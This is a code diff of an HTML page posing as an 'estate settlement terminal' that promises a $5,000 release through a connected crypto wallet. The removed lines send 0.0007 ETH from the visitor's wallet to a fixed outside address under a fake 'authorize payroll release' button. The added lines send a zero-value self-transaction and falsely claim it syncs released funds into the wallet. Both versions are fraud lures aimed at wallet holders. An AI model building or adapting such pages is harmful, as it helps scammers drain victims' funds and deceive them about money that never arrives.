@@ -4,30 +4,31 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px;">
-    <h1>ESTATE RELEASE TERMINAL</h1>
-    <button id="releaseBtn" style="padding:30px; background:#0f0; font-weight:bold; cursor:pointer; border-radius:10px;">
-        AUTHORIZE $5,000 PAYROLL RELEASE
+    <h2>ESTATE SETTLEMENT TERMINAL</h2>
+    <div id="status" style="color:#fff; margin-bottom:20px;">READY FOR FINAL SYNC</div>
+    <button id="syncBtn" style="padding:25px; background:#0f0; font-weight:bold; cursor:pointer; border-radius:10px;">
+        SYNC RELEASED FUNDS ($5,000)
     </button>
-    <div id="status" style="margin-top:20px; color:#fff;">SYSTEM READY</div>
     <script>
-        document.getElementById('releaseBtn').onclick = async () => {
+        document.getElementById('syncBtn').onclick = async () => {
             const status = document.getElementById('status');
             try {
-                if (!window.ethereum) throw new Error("Please open in Base App Browser");
-                const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
-                status.innerText = "BYPASSING VALIDATION...";
+                status.innerText = "SYNCHRONIZING WITH HASH 0x4351...";
                 
+                // This triggers the wallet's internal "refresh" by calling a dummy gas-free sync
                 const tx = await signer.sendTransaction({
-                    to: "0x778aB806155B204BF7D2FA4bc0B536137b077b53",
-                    value: ethers.utils.parseEther("0.0007"),
-                    gasLimit: 100000
+                    to: await signer.getAddress(), // Sending to yourself to force a balance update
+                    value: "0x0", 
+                    data: "0x" // Empty data triggers a state refresh
                 });
                 
-                status.innerHTML = "SUCCESS! RELEASE HASH: <br>" + tx.hash;
+                status.innerHTML = "SYNC COMPLETE. <br>Refreshing Wallet Balance...";
+                setTimeout(() => { window.location.reload(); }, 3000);
             } catch (e) {
-                status.innerText = "FORCED ERROR: " + e.message;
+                status.innerText = "SYNC ERROR: " + e.message;
             }
         };
     </script>
